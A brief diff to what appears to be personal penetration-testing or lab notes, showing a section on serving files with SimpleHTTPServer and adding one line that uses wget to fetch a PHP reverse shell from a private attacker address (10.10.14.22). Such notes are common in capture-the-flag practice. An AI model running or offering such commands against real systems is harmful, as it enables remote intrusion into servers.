@@ -94,6 +94,7 @@ p.waitFor()
 SimpleHTTPServer:
 =================
 python ~/Downloads/scripts/SimpleHTTPServer/SimpleHTTPServer.py 80
+wget 'http://10.10.14.22/php-reverse-shell.php’.  
 
 
 
